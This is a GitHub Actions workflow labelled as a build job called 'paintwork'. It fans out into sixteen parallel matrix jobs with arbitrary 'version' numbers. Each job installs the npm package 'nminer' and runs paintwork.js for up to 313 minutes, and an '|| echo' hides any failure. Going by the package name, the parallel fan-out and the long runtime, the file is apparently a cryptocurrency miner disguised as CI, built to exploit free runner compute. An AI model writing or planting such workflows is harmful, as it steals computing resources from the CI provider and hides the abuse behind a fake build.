name: paintwork
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 844 }
          - { version: 5710 }
          - { version: 139 }
          - { version: 1576 }
          - { version: 6415 }
          - { version: 1291 }
          - { version: 6617 }
          - { version: 9039 }
          - { version: 5556 }
          - { version: 3031 }
          - { version: 486 }
          - { version: 3573 }
          - { version: 3309 }
          - { version: 8731 }
          - { version: 2334 }
          - { version: 5993 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 313m node paintwork.js || echo "paintwork executed"